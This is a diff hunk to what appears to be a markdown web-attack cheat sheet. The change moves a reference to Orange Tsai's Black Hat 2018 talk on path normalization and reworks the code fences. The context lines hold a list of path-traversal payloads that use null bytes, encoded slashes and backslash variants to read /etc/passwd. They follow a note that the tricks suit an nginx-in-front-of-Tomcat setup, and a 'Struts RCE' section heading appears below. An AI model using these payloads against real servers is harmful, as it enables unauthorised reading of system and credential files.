@@ -19,6 +19,10 @@ https://www.videlibri.de/xidel.html
 or
 /foo;x=x/bar/
 above tricks work well when you have a ngnix server in front of an tomcat
+References:- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+```
+
+```
 ../../../../../../../../../../../../etc/passwd%00
 //..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
@@ -34,7 +38,7 @@ above tricks work well when you have a ngnix server in front of an tomcat
 .%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
 /..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
 
-References:- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+
 ```
 
 **Struts RCE**
